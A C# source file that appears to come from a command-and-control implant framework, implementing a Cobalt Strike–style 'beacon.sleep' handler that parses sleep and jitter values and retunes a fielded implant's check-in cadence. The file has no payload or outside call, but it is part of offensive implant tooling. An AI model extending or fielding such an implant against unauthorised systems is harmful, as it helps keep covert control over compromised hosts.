using Rod.V1;

namespace Rod.Implant.Internal;

// The beacon.sleep handler: retunes the live check-in cadence on a fielded
// implant (Cobalt Strike's sleep). Runs as an ordinary one-shot task, so the
// change rides whatever check-in carried the tasking and applies from the
// next sleep onward. Lives in its own always-trimmable handler source like
// every other verb; the Cadence it writes is shared infrastructure and never
// leaves the compilation whole.

/// <summary>
/// Parses and applies a beacon.sleep argument string:
/// <c>"&lt;sleep&gt; [&lt;jitter&gt;]"</c> -- Go durations (<c>30s</c>,
/// <c>5m</c>, <c>1m30s</c>) or bare seconds (<c>30</c>, <c>0</c>). A missing
/// jitter keeps the current one; <c>0 0</c> is the interactive-as-poll
/// posture (back-to-back check-ins, tasking picked up the moment it queues).
/// </summary>
internal static class BeaconSleep
{
    public static (TaskOutcome Outcome, string Output) Set(string args, Cadence? cadence)
    {
        if (cadence is null)
            return (TaskOutcome.Failed, "beacon.sleep: no cadence control attached to this dispatch path");

        var tokens = args.Split(' ', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
        if (tokens.Length is < 1 or > 2)
            return (TaskOutcome.Failed, "beacon.sleep: expected \"<sleep> [jitter]\", e.g. \"10s\", \"30 5\", \"0 0\"");

        if (!TryParse(tokens[0], out var sleep))
            return (TaskOutcome.Failed, $"beacon.sleep: '{tokens[0]}' is not a duration (Go style like 30s/5m, or bare seconds)");
        var jitter = cadence.Current.Jitter;
        if (tokens.Length == 2 && !TryParse(tokens[1], out jitter))
            return (TaskOutcome.Failed, $"beacon.sleep: '{tokens[1]}' is not a duration (Go style like 2s, or bare seconds)");

        var prior = cadence.Set(sleep, jitter);
        return (TaskOutcome.Succeeded,
            $"check-in every {Format(sleep)} ± {Format(jitter)} (was {Format(prior.Sleep)} ± {Format(prior.Jitter)});"
            + " applies from the next cycle"
            + (sleep == TimeSpan.Zero ? " -- back-to-back check-ins, the near-interactive posture" : ""));
    }

    // One duration token: a Go duration the baked profile already speaks
    // ("30s", "5m", "1m30s") when it carries a unit letter, or a bare number
    // read as seconds -- the shape an operator types fastest at a console
    // ("sleep 0"). TimeSpan.TryParse is deliberately not used for the bare
    // form: it reads "30" as thirty days.
    private static bool TryParse(string token, out TimeSpan value)
    {
        value = TimeSpan.Zero;
        if (token.Length == 0)
            return false;

        if (token.Any(char.IsLetter))
        {
            var parsed = Config.ParseGoDuration(token, TimeSpan.MinValue);
            if (parsed == TimeSpan.MinValue || parsed < TimeSpan.Zero)
                return false;
            value = parsed;
            return true;
        }

        if (!double.TryParse(token, System.Globalization.NumberStyles.Float,
                System.Globalization.CultureInfo.InvariantCulture, out var seconds)
            || seconds < 0)
        {
            return false;
        }
        value = TimeSpan.FromSeconds(seconds);
        return true;
    }

    // The report format: whole seconds read clean, sub-second precision reads
    // exact -- "500ms" matters at the interactive end of the range.
    private static string Format(TimeSpan value)
        => value >= TimeSpan.FromSeconds(1) || value == TimeSpan.Zero
            ? $"{(long)value.TotalSeconds}s"
            : $"{value.TotalMilliseconds:0}ms";
}
